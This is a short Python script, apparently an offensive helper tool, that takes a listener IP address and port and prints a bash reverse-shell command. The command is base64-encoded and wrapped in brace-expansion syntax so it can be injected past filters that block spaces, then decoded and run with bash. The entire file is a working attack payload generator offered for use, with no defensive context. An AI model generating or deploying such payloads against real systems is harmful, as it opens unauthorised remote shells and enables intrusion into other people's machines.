#!/usr/bin/env python

import argparse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('--host_ip', '-hi', help='host IP address for listening', required=True)
parser.add_argument('--port', '-p', help='host port for listening, default 54321', default=54321)
args = parser.parse_args()


if __name__ == '__main__':
    shell = 'bash -i >& /dev/tcp/'+args.host_ip+'/'+args.port+' 0>&1'
    shell = str(base64.b64encode(shell.encode("utf-8")),"utf-8")
    shell = "bash -c {echo," + shell + "}|{base64,-d}|{bash,-i}"
    print(shell)
